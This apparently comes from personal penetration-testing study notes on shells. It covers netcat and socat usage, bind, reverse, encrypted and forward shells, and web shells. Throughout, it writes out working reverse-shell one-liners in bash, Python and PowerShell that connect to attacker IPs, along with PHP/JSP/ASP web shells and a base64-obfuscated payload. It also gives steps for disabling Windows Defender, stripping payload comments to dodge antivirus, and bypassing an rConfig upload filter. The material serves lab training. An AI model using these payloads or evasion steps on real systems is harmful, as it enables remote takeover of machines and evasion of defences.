## Anatomy of a Shell

Every operating system has a shell, and to interact with it, we must use an application known as a _terminal emulator_. Here are some of the most common terminal emulators:  

| Terminal Emulator | Operating System  |
| --- | ------- |
| Windows Terminal | Windows  |
| cmder | Windows  |
| PuTTY | Windows  |
| kitty | Windows, Linux and MacOS  |
| Alacritty | Windows, Linux and MacOS  |
| xterm | Linux  |
| GNOME Terminal | Linux  |
| MATE Terminal | Linux  |
| Konsole | Linux  |
| Terminal | MacOS  |
| iTerm2 | MacOS |

A way we can identify the language interpreter is by viewing the processes running on the machine.

-   In _Linux_, we can do this using _ps_ or _env_

```bash
m1l0js@htb[/htb]$ ps
PID TTY          TIME CMD
4232 pts/1    00:00:00 bash
11435 pts/1    00:00:00 ps

m1l0js@htb[/htb]$ env
SHELL=/bin/bash
```

-   In _powershell_ we can know the edition of PowerShell

```powershell
PS> $PSversiontable 
```

One of the main points we can take away from this is a terminal emulator is not tied to one specific language. Actually, the shell language can be changed and customized to suit the sysadmin, developer, or pentester's personal preference, workflow, and technical needs.

---
## Typical server extensions
-   ASP ==> Windows Servers
-   JSP ==> Apache Tomcats
-   PHP ==> Classical Apache
***
## Netcat 
### What is netcat?
Network utility used to read and write data to network connections using TCP or UDP. 
### What can we do with it?
It can be used to perform:
* Banner Grabbing
* Port Scanning
* Transferring Files
* Bind/Reverse Shells
### Basic options 

| option | meaning |
| --- | --- | 
| `-v` | verbose |
| `-l` | listen |
| `-n` | no dns resolution |
| `-e` | exec |
| `-u` | UDP connection |
| `-k` | Keep listening after client disconnects | 
|  	  `-z`| zero I/O|

### How to transfer nc.exe to a Windows machine?
* Windows machine connects to us (A: Attacker / V: Victim)
```powershell
A: cp /usr/share/windows-resources/nc.exe .
A: python3 -m http.server 80
V: certutil -urlcache -f http://<AttackIP>/nc.exe nc.exe
```
### How to transfer a file to a Linux machine?
```bash 
A: vim test.txt
V: nc.exe -nvlp 1234 > test.txt
A: nc -nv VictimMachine 1234 < test.txt
```
### Alternatives in Powershell?
There's another Windows alternative to netcat coded in PowerShell called [PowerCat](https://github.com/besimorhino/powercat)#
k
## Socat
### How to transfer socat to target machine?
Most machines do not have socat installed by default, however, it's possible to upload a precompiled socat binary, which can then be executed as normal.
* Set up a python server with the socat binary in this directory.
```bash
sudo python3 -m http.server 80 
```
Request file from the target machine
* Linux: 
```bash
wget <LOCAL-IP>/socat -O /tmp/socat
```
* Windows:
 ```powershell
 Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe 
```
### Simple usage example of socat
We will be listening in our machine
```bash
socat file:`tty`,raw,echo=0 tcp-listen:4444
```
Start the connection on the victim side
```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```

### Reverse shell with socat
In our machine
```bash
socat TCP-L:<port> - #Equivalent to nc -lvnp <port>. 
```
Victim machine:
* Linux
```bash
socat TCP4:<LOCAL-IP:<LOCAL-PORT> EXEC:"bash -li"
```
* Windows
```powershell
socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes //Pipes used to force powershell or cmd.exe to use Unix style standard input and output
```

#### Fully stable Linux TTY reverse shell (Only on Linux)
In our machine
```bash
socat TCP-L:<port> FILE:`tty`,raw,echo=0
```
Victim machine
```bash
socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```
##### What does this options mean?

Option | Function
-- | --
pty | Allocates a pseudoterminal on the target. It is part of the stabilisation process
stderr | Makes sure that any error messages get shown in the shell (often a problem with non-interactive shells)
sigint | Passes any Ctrl + C commands through into the sub-process, allowing us to kill commands inside the shell
setsid  | Creates the process in a new session
sane | Stabilises the terminal, attempting to "normalise" it.

If, at any point, a socat shell is not working correctly, it's well worth increasing the verbosity by adding -d -d into the command. This is very useful for experimental purposes, but is not usually necessary for general use.
	  
### Bind shell with socat
Our machine
```bash
socat TCP:<TARGET-IP>:<TARGET-PORT> -
```
Victim machine:
* Linux
```bash
socat TCP-L:<PORT> EXEC:"bash -li"
```
* Windows
```powershell
socat TCP-L:<PORT> EXEC:powershell.exe,pipes
```

### Encrypted shells 
```bash
openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
```
We then need to merge the two files into a single .pem file:
```bash
cat shell.key shell.crt > shell.pem
```
#### Encrypted reverse shell
Our machine
```bash
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -

//Example
socat `tty`,raw,echo=0 openssl-listen:4126,reuseaddr,cert=shell.pem,verify=0
Where:
//   `tty`,raw,echo=0 (suppresses the "echo" and allows to get an interactive terminal)
//   openssl-listen:<port> (socat in listening mode)
//   reuseaddr (allows to reuse the connection port)
//   cert=<certificate_path> (location of our certificate in PEM format)
//   verify=0 (suppresses the verification of the certificate)
```

Victim machine:
* Linux
```bash
socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash

//Example
socat openssl-connect:192.168.25.88:1337,verify=0 exec:bash,pty,stderr,setsid
Where:
//    openssl-connect:<ip>:<port> (socat connection mode where we define the ip and port of our attacker machine)
//    verify=0 (suppresses certificate verification) 
//    exec:bash,pty,stderr,setsid (bash execution, pty pseudo terminal,stderr standard error output, setsid creates a new session)
```
#### Encrypted bind shell
Our machine
```bash
socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -
```
Victim machine:
* Windows
```cmd
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes
```
_verify=0_ tells the connection to not bother trying to validate that our certificate has been properly signed by a recognised authority. Please note that the certificate must be used on whichever device is listening.

## Types of shells
### Forward shell
**Forward Shell**: Esta técnica se utiliza cuando no se pueden establecer conexiones Reverse o Bind debido a reglas de Firewall implementadas en la red. Se logra mediante el uso de **mkfifo**, que crea un archivo **FIFO** (**named pipe**), que se utiliza como una especie de “**consola simulada**” interactiva a través de la cual el atacante puede operar en la máquina remota. En lugar de establecer una conexión directa, el atacante redirige el tráfico a través del archivo **FIFO**, lo que permite la comunicación bidireccional con la máquina remota. 
Se puede utilizar [tty_over_http](https://raw.githubusercontent.com/s4vitar/ttyoverhttp/master/tty_over_http.py). 
```bash
┌──(user㉿kali)-[~/Documents/testing/example]
└─$ mkfifo input; tail -f input | /bin/sh 2>&1 > output

┌──(user㉿kali)-[~/Documents/testing/example]
└─$ echo whoami > input

┌──(user㉿kali)-[~/Documents/testing/example]
└─$ cat output
user

┌──(user㉿kali)-[~/Documents/testing/example]
└─$ echo pwd > input 

┌──(user㉿kali)-[~/Documents/testing/example]
└─$ cat output
user
/home/user/Documents/testing/example

┌──(user㉿kali)-[~/Documents/testing/example]
└─$ echo "cd /home" > input 

┌──(user㉿kali)-[~/Documents/testing/example]
└─$ echo "pwd" > input

┌──(user㉿kali)-[~/Documents/testing/example]
└─$ cat output
user
/home/user/Documents/testing/example
/home
```
### Bind Shells
With a bind shell, _the target system has a listener started and awaits a connection from a pentester's system (attack box)_.
There can be many *challenges* associated with getting a shell this way. Here are some to consider:
* There would have to be a _listener already started on the target_.
* If there is no listener started, we would need to find a way to make this happen.
* Admins typically configure _strict incoming firewall rules and NAT_ (with PAT implementation) on the edge of the network (public-facing), so we would need to be on the internal network already.
* _Operating system firewalls_ (on Windows & Linux) will likely block most incoming connections that aren't associated with trusted network-based applications.
* Unike a Reverse Shell, if we drop our connection to a bind shell for any reason, we can connect back to it and get another connection immediately. However, _if the bind shell command is stopped for any reason_, or if the remote host is rebooted, _we would still lose our access to the remote host and will have to exploit it again to gain access_.
#### Practicing with GNU Netcat
1. Server - Target starting Netcat listener 
	- In this instance, the target will be our server, and the attack box will be our client. Once we hit enter, the listener is started and awaiting a connection from the client.
```bash
Target@server:~$ nc -lvnp 7777
Listening on [0.0.0.0] (family 0, port 7777)
```

2. Client - Attack box connecting to target
	- Back on the client (attack box), we will use nc to connect to the listener we started on the server.
	- Notice how we are using nc on the client and the server. On the client-side, we specify the server's IP address and the port that we configured to listen on (7777). Once we successfully connect, we can see:
		- A succeeded! message on the client.
		- A received! message on the server.
3. Server - Target receiving connection from client
```bash 
Target@server:~$ nc -lvnp 7777
Listening on [0.0.0.0] (family 0, port 7777)
Connection from 10.10.14.117 51872 received!    
```
Know that this is not a proper shell. It is just a Netcat TCP session we have established. We can see its functionality by typing a simple message on the client-side and viewing it received on the server-side.

4. Client - Attack box sending message Hello Academy
```bash
 m1l0js@htb[/htb]$ nc -nv 10.129.41.200 7777
 Connection to 10.129.41.200 7777 port [tcp/*] succeeded!
 Hello Academy  
```
Once we type the message and hit enter, we will notice the message is received on the server-side.

5. Server - Target receiving Hello Academy message
```bash
Victim@server:~$ nc -lvnp 7777
Listening on [0.0.0.0] (family 0, port 7777)
Connection from 10.10.14.117 51914 received!
Hello Academy
```
#### Establishing a Basic Bind Shell with Netcat
We have shown that we can use Netcat to send text between the client and the server, but _this is not a bind shell because we cannot interact with the OS and file system. We are only able to pass text within the pipe setup by Netcat_. Let's use Netcat to serve up our shell to establish a real bind shell.
On the server-side, we will need to specify the directory, shell, listener, work with some pipelines, and input & output redirection to ensure a shell to the system gets served when the client attempts to connect.
1. Server - Binding a Bash shell to the TCP session
```bash
Target@server:~$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
```

The commands above are considered our payload, and we delivered this payload manually. We will notice that the commands and code in our payloads will differ depending on the host operating system we are delivering it to.
Back on the client, use Netcat to connect to the server now that a shell on the server is being served.

2. Client - Connecting to bind shell on target
```bash
m1l0js@htb[/htb]$ nc -nv 10.129.41.200 7777
Target@server:~$  
```
We will notice that we have successfully established a bind shell session with the target. Keep in mind that we had complete control over both our attack box and the target system in this scenario, which isn't typical. We worked through these exercises to understand the basics of the bind shell and how it works without any security controls (NAT enabled routers, hardware firewalls, Web Application Firewalls, IDS, IPS, OS firewalls, endpoint protection, authentication mechanisms, etc...) in place or exploits needed. This fundamental understanding will be helpful as we get into more challenging situations and realistic scenarios working with vulnerable systems.

As mentioned earlier in this section, it is also good to remember that the bind shell is much easier to defend against. Since the connection will be received incoming, it is more likely to get detected and blocked by firewalls even if standard ports are used when starting a listener. There are ways to get around this by using a reverse shell which we will discuss in the next section.
#### Examples of netcat to bind shells
A netcat listener can be setup to execute a specific executable like cmd.exe or /bin/bash when a client connects to the listener.
* From Linux to Windows
```bash
V: nc -nvlp 1234 -e cmd.exe 
A: nc -nv 10.4.21.221 1234
```
* From Windows to Linux
```bash
A: nc -nvlp 1234 -c /bin/bash //In Linux
V: nc.exe -nv 10.10.3.2 1234
```
#### Reliable commands for bind shells
* Bash
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
```
* Python
```python
python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
```
* Powershell
```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
```

### Reverse shell
With a reverse shell, the attack box will have a listener running, and the target will need to initiate the connection.
We will often use this kind of shell as we come across vulnerable systems because it is likely that an admin will overlook outbound connections, giving us a better chance of going undetected. The last section discussed how bind shells rely on incoming connections allowed through the firewall on the server-side. It will be much harder to pull this off in a real-world scenario. 
We don't always need to re-invent the wheel when it comes to payloads (commands & code) we intend to use when attempting to establish a reverse shell with a target. There are helpful tools that infosec veterans have put together to assist us. [Reverse Shell Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) is one fantastic resource that contains a list of different commands, code, and even automated reverse shell generators we can use when practicing or on an actual engagement. We should be mindful that many admins are aware of public repositories and open-source resources that penetration testers commonly use. They can reference these repos as part of their core considerations on what to expect from an attack and tune their security controls accordingly. In some cases, we may need to customize our attacks a bit.

#### Hands-on With A Simple Reverse Shell in Windows
With this walkthrough, we will be establishing a simple reverse shell using some PowerShell code on a Windows target. Let's start the target and begin. As a Metasploit user, we will meet these under the common names reverse_tcp, reverse_https, and bind_tcp.
We can start a Netcat listener on our attack box.
```bash
Server (attack box) 
m1l0js@htb[/htb]$ sudo nc -lvnp 443
Listening on 0.0.0.0 443
```
This time around with our listener, we are binding it to a common port: 443. This port usually is for HTTPS connections. _We may want to use common ports like this because when we initiate the connection to our listener, we want to ensure it does not get blocked going outbound through the OS firewall and at the network level_. It would be rare to see any security team blocking 443 outbound since many applications and organizations rely on HTTPS to get to various websites throughout the workday. That said, _a firewall capable of deep packet inspection and Layer 7 visibility may be able to detect & stop a reverse shell going outbound on a common port because it's examining the contents of the network packets, not just the IP address and port_. Detailed firewall evasion is outside of the scope of this module, so we will only briefly touch on detection & evasion techniques throughout the module, as well as in the dedicated section at the end.
Netcat can be used to initiate the reverse shell on the Windows side, but _we must be mindful of what applications are present on the system already_. Netcat is *not* native to Windows systems, so it may be unreliable to count on using it as our tool on the Windows side. We will see in a later section that to use Netcat in Windows, we must transfer a Netcat binary over to a target, which can be tricky when we don't have file upload capabilities from the start. That said, _it's ideal to use whatever tools are native (living off the land) to the target we are trying to gain access to_.
##### What applications and shell languages are hosted on the target?
This is an excellent question to ask any time we are trying to establish a reverse shell. Let's use command prompt & PowerShell to establish this simple reverse shell. We can use a standard PowerShell reverse shell one-liner to illustrate this point.
On the Windows target(client), open a command prompt and copy & paste this command:
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

##### What happened when we hit enter in command prompt?
```powershell
This script contains malicious content and has been blocked by your antivirus software.
```
The _Windows Defender antivirus (AV) software stopped the execution of the code_. This is working exactly as intended, and from a defensive perspective, this is a win. From an offensive standpoint, there are some obstacles to overcome if AV is enabled on a system we are trying to connect with. _For our purposes_, we will want to disable the antivirus through the Virus & threat protection settings or by using this command in an administrative PowerShell console (right-click, run as admin):
##### Disable AV
```powershell
PS C:\Users\htb-student> Set-MpPreference -DisableRealtimeMonitoring $true
```
Once AV is disabled, attempt to execute the code again.
```bash
Server (attack box)
m1l0js@htb[/htb]$ sudo nc -lvnp 443
Listening on 0.0.0.0 443
Connection received on 10.129.36.68 49674
PS C:\Users\htb-student> whoami
ws01\htb-student
```

#### Reverse shell payloads (One-liners examined)
##### Netcat/Bash Reverse Shell One-liner
```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.12 7777 > /tmp/f
```
The commands above make up a common one-liner issued on a Linux system to serve a Bash shell on a network socket utilizing a Netcat listener. We used this earlier in the Bind Shells section. It's often copied & pasted but not often understood. Let's break down each portion of the one-liner:
* Removes the /tmp/f file if it exists, -f causes rm to ignore nonexistent files. The semi-colon (;) is used to execute the command sequentially.
```bash
rm -f /tmp/f; 
```
* Makes a [FIFO](https://man7.org/linux/man-pages/man7/fifo.7.html) named pipe file at the location specified. In this case, /tmp/f is the FIFO named pipe file, the semi-colon (;) is used to execute the command sequentially.
```bash 
mkfifo /tmp/f;
```
* Concatenates the FIFO named pipe file /tmp/f, the pipe (|) connects the standard output of cat /tmp/f to the standard input of the command that comes after the pipe (|).
```bash 
cat /tmp/f | 
```
* Specifies the command language interpreter using the -i option to ensure the shell is interactive. 2>&1 ensures the standard error data stream (2) & standard input data stream (1) are redirected to the command following the pipe (|).
```bash
/bin/bash -i 2>&1 | 
```
* Uses Netcat to send a connection to our attack host 10.10.14.12 listening on port 7777. The output will be redirected (>) to /tmp/f, serving the Bash shell to our waiting Netcat listener when the reverse shell one-liner command is executed
```bash
nc 10.10.14.12 7777 > /tmp/f  
```
  
##### PowerShell One-liner Explained
The shells & payloads we choose to use largely depend on which OS we are attacking. Be mindful of this as we continue throughout the module. We witnessed this in the reverse shells section by establishing a reverse shell with a Windows system using PowerShell. Let's breakdown the one-liner we used:
* Powershell One-liner
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
We will dissect the rather large PowerShell command you can see above. It may look like a lot, but hopefully, we can demystify it a bit.
* Executes powershell.exe with no profile (nop) and executes the command/script block (-c) contained in the quotes. This particular command is issued inside of command-prompt, which is why PowerShell is at the beginning of the command. It's good to know how to do this if we discover a Remote Code Execution vulnerability that allows us to execute commands directly in cmd.exe.
```powershell
powershell -nop -c 
```
* Binding a socket. Sets/evaluates the variable $client equal to (=) the New-Object cmdlet, which creates an instance of the System.Net.Sockets.TCPClient .NET framework object. The .NET framework object will connect with the TCP socket listed in the parentheses (10.10.14.158,443). The semi-colon (;) ensures the commands & code are executed sequentially.
```powershell
"$client = New-Object System.Net.Sockets.TCPClient(10.10.14.158,433);
```
* Setting The Command Stream. Sets/evaluates the variable $stream equal to (=) the $client variable and the .NET framework method called GetStream that facilitates network communications. The semi-colon (;) ensures the commands & code are executed sequentially.
```powershell
$stream = $client.GetStream();
```
* Empty Byte Stream. Creates a byte type array ([]) called $bytes that returns 65,535 zeros as the values in the array. This is essentially an empty byte stream that will be directed to the TCP listener on an attack box awaiting a connection.
```powershell
[byte[]]$bytes = 0..65535|%{0}; 
```
* Stream Parameters. Starts a while loop containing the $i variable set equal to the .NET framework Stream.Read [stream.Read](https://docs.microsoft.com/en-us/dotnet/api/system.io.stream.read?view=net-5.0) method.
* The parameters: buffer ($bytes), offset (0), and count ($bytes.Length) are defined inside the parentheses of the method.
```powershell
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
```
* Set the Byte Encoding. Sets/evaluates the variable \$data equal to an ASCII encoding .NET framework class that will be used in conjunction with the GetString method to encode the byte stream (\$bytes) into ASCII. 
* In short, what we type won't just be transmitted and received as empty bits but will be encoded as ASCII text. The semi-colon (;) ensures the commands & code are executed sequentially.
```powershell
{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);
```
* Invoke-Expression. Sets/evaluates the variable $sendback equal to (=) the Invoke-Expression (iex) cmdlet against the $data variable, then redirects the standard error (2>) & standard input (1) through a pipe (|) to the Out-String cmdlet which converts input objects into strings. 
* Because Invoke-Expression is used, everything stored in $data will be run on the local computer. The semi-colon (;) ensures the commands & code are executed sequentially.
```powershell
$sendback = (iex $data 2>&1 | Out-String ); 
```
* Show working Directory. Sets/evaluates the variable $sendback2 equal to (=) the $sendback variable plus (+) the string PS ('PS') plus + path to the working directory ((pwd).path) plus (+) the string '> '. This will result in the shell prompt being PS C:\workingdirectoryofmachine >. The semi-colon (;) ensures the commands & code are executed sequentially. 
* Recall that the + operator in programming combines strings when numerical values aren't in use, with the exception of certain languages like C and C++ where a function would be needed.
```powershell
$sendback2 = $sendback + 'PS ' + (pwd).path + '> ';` 
```
* Sets sendbyte. Sets/evaluates the variable $sendbyte equal to (=) the ASCII encoded byte stream that will use a TCP client to initiate a PowerShell session with a Netcat listener running on the attack box.
```powershell
$sendbyte=  ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}
```
* Terminate TCP connection. This is the [TcpClient.Close](https://docs.microsoft.com/en-us/dotnet/api/system.net.sockets.tcpclient.close?view=net-5.0)  method that will be used when the connection is terminated.
```powershell
$client.Close()"
```
    
The one-liner we just examined together can also be executed in the form of a PowerShell script (.ps1). We can see an example of this by viewing the source code below. This source code is part of the nishang in [Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) project:
####  Examples of netcat to reverse shells
* From Linux to Linux
```bash
A: nc -nvlp 1234
V: nc -nv 10.10.0.2 1234 -e /bin/bash
```
* From Windows to Linux
```bash
A: nc -nlvp 1234
V: nc.exe -nv 10.10.0.2 1234 -e cmd.exe
```

#### Reliable commands for reverse shells
* Bash
```bash
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
```
* Powershell
```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.10.10.10",1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
### Web shell
Communicates through a web server, accepts our commands through HTTP parameters, executes them, and prints back the output.

#### Considerations when Dealing with Web Shells
When utilizing web shells, _consider the below potential issues_ that may arise during your penetration testing process:
* Web applications sometimes _automatically delete files after a pre-defined period_.
* _Limited interactivity with the operating system_ in terms of navigating the file system, downloading and uploading files, chaining commands together may not work (ex. whoami && hostname), slowing progress, especially when performing enumeration 
* Potential _instability_ through a non-interactive web shell
* _Greater chance of leaving behind proof_ that we were successful in our attack
	- Depending on the engagement type (i.e., a black box evasive assessment), we may need to attempt to go undetected and cover our tracks. We are often helping our clients test their capabilities to detect a live threat, so we should emulate as much as possible the methods a malicious attacker may attempt, including attempting to operate stealthily. This will help our client and save us in the long run from having files discovered after an engagement period is over. 
	- In most cases, when attempting to gain a shell session with a target, it would be wise to:
		- _Establish a reverse shell and then delete the executed payload_.
		- We must _document every method we attempt, what worked & what did not work, and even the names of the payloads & files we tried to use_. 
		- We could _include a sha1sum or MD5 hash of the file name_, upload locations in our reports as proof, and provide attribution.
  
However, if we only have remote command execution through an exploit, we can write our shell directly to the webroot to access it over the web. So, _the first step is to identify where the webroot is_. The following are the default webroots for common web servers:
Web Server 	| Default Webroot
-- | -- 
Apache |	/var/www/html/
Nginx | 	/usr/local/nginx/html/
IIS | 	c:\inetpub\wwwroot\
XAMPP 	| C:\xampp\htdocs\

We can check these directories to see which webroot is in use and then use echo to write out our web shell. For example, if we are attacking a Linux host running Apache, we can write a PHP shell with the following command:
```php
echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
```
Once we write our web shell, we can either access it through a browser or by using cURL. We can visit the shell.php page on the compromised website, and use ?cmd=id to execute the id command:
* By Curl
```bash
curl http://SERVER_IP:PORT/shell.php?cmd=id
```
* By Browser
`http://SERVER_IP:PORT/shell.php?cmd=id`

#### Advantages of a web shell
* A great benefit of a web shell is that _it would bypass any firewall restriction in place_, as it will not open a new connection on a port but run on the web port on 80 or 443, or whatever port the web application is using. 
* Another great benefit is that _if the compromised host is rebooted, the web shell would still be in place, and we can access it and get command execution without exploiting the remote host again_.
#### Disadvantages of a web shell
* On the other hand, _a web shell is not as interactive as reverse and bind shells are since we have to keep requesting a different URL to execute our commands_. Still, in extreme cases, it is possible to code a Python script to automate this process and give us a semi-interactive web shell right within our terminal.

#### Reliable web shells scripts
* PHP
```php 
<?php system($_REQUEST["cmd"]); ?>
```
* JSP 
```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```
* ASP
```asp
<% eval request("cmd") %>
```
* Python //If the web shell runs in a Linux and interprets Python
```bash
echo 'bash -c "bash -i >& /dev/tcp/192.168.188.133/4126 0>&1"' | base64
__import__("os").system("echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTk2Ljg1LjIvNDQ0NCAwPiYxIgo= | base64 -d | bash")
```

#### Uploading a Web Shell
_Laudanum is a repository of ready-made files that can be used to inject onto a victim and receive back access via a reverse shell, run commands on the victim host right from the browser, and more_. The repo includes injectable files for many different web application languages to include asp, aspx, jsp, php, and more. This is a staple to have on any pentest. If you are using your own VM, Laudanum is built into Parrot OS and Kali by default. For any other distro, you will likely need to pull a copy down to use. You can get it here. Let's examine [Laudanum](https://github.com/jbarcia/Web-Shells/tree/master/laudanum) and see how it works.

##### Working with Laudanum
The Laudanum files can be found in the _/usr/share/webshells/laudanum_ directory. For most of the files within Laudanum, you can copy them as-is and place them where you need them on the victim to run. For specific files such as the shells, you must edit the file first to insert your attacking host IP address to ensure you can access the web shell or receive a callback in the instance that you use a reverse shell. Before using the different files, be sure to read the contents and comments to ensure you take the proper actions.
* Move a copy for modification
```bash
m1l0js@htb[/htb]$ cp /usr/share/webshells/laudanum/aspx/shell.aspx /home/tester/demo.aspx
```
* _Add your IP address_ to the allowedIps variable on line 59. Make any other changes you wish. It can be prudent to _remove the ASCII art and comments from the file_. These items in a payload are often signatured on and can alert the defenders/AV to what you are doing.
* Once we have our web shell, _we need to place our web shell script into the remote host's web directory (webroot) to execute the script through the web browser_. This can be through a vulnerability in an upload feature, which would allow us to write one of our shells to a file, i.e. shell.php and upload it, and then access our uploaded file to execute commands.
* Once the upload is successful, you will need to navigate to your web shell to utilize its functions. You may run into some implementations that randomize filenames on upload that do not have a public files directory or any number of other potential safeguards. 

#### ASPX eplained
Active Server Page Extended (ASPX) is a _file type/extension written for Microsoft's ASP.NET Framework_. On a web server running the ASP.NET framework, web form pages can be generated for users to input data. On the server side, the information will be converted into HTML. We can take advantage of this by using an ASPX-based web shell to control the underlying Windows operating system. Let's witness this first-hand by utilizing the Antak Webshell.
##### Antak Webshell
* Antak is a _web shell built-in ASP.Net included within the Nishang project_. Nishang is an Offensive PowerShell toolset that can provide options for any portion of your pentest. Since we are focused on web applications for the moment, let's keep our eyes on Antak. _Antak utilizes PowerShell to interact with the host, making it great for acquiring a web shell on a Windows server_. The UI is even themed like PowerShell. It's time to dive in and experiment with Antak.
* Antak web shell functions like a Powershell Console. However, it will execute each command as a new process. It can also execute scripts in memory and encode commands you send. As a web shell, Antak is a pretty powerful tool.
* The Antak files can be found in the _/usr/share/nishang/Antak-WebShell_ directory.

#### Hands-on With a PHP-Based Web Shell.
Since PHP processes code & commands on the server-side, we can use pre-written payloads to gain a shell through the browser or initiate a reverse shell session with our attack box. _In this case, we will take advantage of the vulnerability in rConfig 3.9.6 to manually upload a PHP web shell and interact with the underlying Linux host_. In addition to all the functionality mentioned earlier, rConfig allows admins to add network devices and categorize them by vendor. Go ahead and log in to rConfig with the default credentials (admin:admin), then navigate to Devices > Vendors and click Add Vendor.

We will be using [WhiteWinterWolf's PHP Web Shell](https://github.com/WhiteWinterWolf/wwwolf-php-webshell). We can download this or copy and paste the source code into a .php file. Keep in mind that the file type is significant, as we will soon witness. _Our goal is to upload the PHP web shell via the Vendor Logo browse button_. Attempting to do this initially will fail since rConfig is checking for the file type. It will only allow uploading image file types (.png,.jpg,.gif, etc.). However, we can bypass this utilizing Burp Suite: 
```bash
sed 's/#.*$//' -e '/^$/d' myshell.php
sed 's://.*::g' shell.php //To eliminate comments
sed '/./!d' shell.php //To eliminate blank lines
```

* Start Burp Suite, navigate to the browser's network settings menu and fill out the proxy settings. 127.0.0.1 will go in the IP address field, and 8080 will go in the port field to ensure all requests pass through Burp (recall that Burp acts as the web proxy).
* Our goal is to change the content-type to bypass the file type restriction in uploading files to be "presented" as the vendor logo so we can navigate to that file and have our web shell.
	- With Burp open and our web browser proxy settings properly configured, we can now upload the PHP web shell. Click the browse button, navigate to wherever our .php file is stored on our attack box, and select open and Save (we may need to accept the PortSwigger Certificate). It will seem as if the web page is hanging, but that's just because we need to tell Burp to forward the HTTP requests. Forward requests until you see the POST request containing our file upload. 
	- As mentioned in an earlier section, you will notice that some payloads have comments from the author that explain usage, provide kudos and links to personal blogs. This can give us away, so it's not always best to leave the comments in place. _We will change Content-type from application/x-php to image/gif_. This will essentially "trick" the server and allow us to upload the .php file, bypassing the file type restriction. Once we do this, we can select Forward twice, and the file will be submitted. We can turn the Burp interceptor off now and go back to the browser to see the results.
